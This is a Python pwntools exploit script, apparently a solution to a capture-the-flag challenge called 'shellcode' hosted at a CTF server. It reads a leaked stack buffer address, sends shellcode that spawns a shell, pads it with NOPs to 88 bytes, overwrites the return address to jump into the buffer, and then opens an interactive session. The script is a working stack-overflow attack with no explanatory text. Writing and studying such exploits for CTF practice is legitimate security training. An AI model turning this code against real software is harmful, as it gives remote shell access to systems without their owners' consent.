#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./shellcode"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("nc.ctf.setodanote.net", 26503)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+144
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

p.recvuntil("target | [")
buf_addr = eval(p.recv(14))
log.info("buf: " + hex(buf_addr))

shellcode = asm(shellcraft.sh())

payload = b""
payload += shellcode
payload += b"\x90" * (88 - len(shellcode))
payload += p64(buf_addr)

p.recvuntil(">")
p.sendline(payload)

p.interactive()
